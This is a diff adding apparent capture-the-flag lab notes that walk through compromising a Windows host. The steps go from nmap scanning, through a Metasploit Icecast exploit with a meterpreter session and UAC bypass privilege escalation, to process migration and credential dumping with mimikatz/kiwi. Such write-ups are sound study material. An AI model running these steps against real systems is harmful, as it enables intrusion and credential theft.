@@ -1,0 +1,52 @@
+First do an NMAP on just the IP address
+	nmap 10.10.68.241
+When open ports come back lets see more information about those different ports
+	sudo nmap -sS -Pn -A -vv -A -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 10.10.68.241 -sV
+Now that we have completed the first step, lets move on to the next one
+	msfconsole
+	search icecast
+We can see here that their is an exploit for windows icecast, lets use that exploit
+	use icecast, or just use 0
+Now look at the only one that needs to be filled in 
+	RHOSTS
+Now set the LHOSTS to what is shown on the access machine page (should be 10 network) 
+Make the RHOSTS the remote machine IP address
+	exploit
+You should make a meterpreter connection
+Now lets see what user was running the icecast connection
+	getuid
+What build is the system running
+	sysinfo
+Now lets see if there are any suggested exploits from meterpreter
+	run post/multi/recon/local_exploit_suggesterrun post/multi/recon/local_exploit_suggester
+Looking at the first attack	
+	exploit/windows/local/bypassuac_eventvwr
+Now background the session (if you need to list sessions just type in the command session)
+	background or CTRL-z
+Now using the command show options will show us that we need to set a session number
+	set session 1
+	show options
+We can see the Listening Host is incorrect, change the LHOST
+	LHOST xxx.xxx.xxx.xxx
+Now run the attack
+	run
+We can see that we now have more session numbers, meterpreter opened again
+Now lets see if we have expanded out priveleges
+	getprivs
+We can now take ownership of files, this is shown with
+	SeTakeOwnershipPrivilege
+With escalate priveleges we can now see the processes listed
+	ps
+We need to interact with the lsass service, this service is used for windows authentication
+We need to interact with another object that will allow us to be able to retrive lsass information
+this means that the service needs to fall within the NT authority and system 32.
+	spoolsv.exe (used for printing)
+Now lets migrate into the spoolsv.exe process
+	migrate -N spoolsv.exe (-N is the name of the process)
+To see what user we are now utilize the following command
+	getuid (as you can see we are now NT Authority/System (we are now administrators)
+Now lets use mimikatz to do a password dump
+	load kiwi (new version of mimikatz)
+Lets retrive all credentials
+	creds_all
+
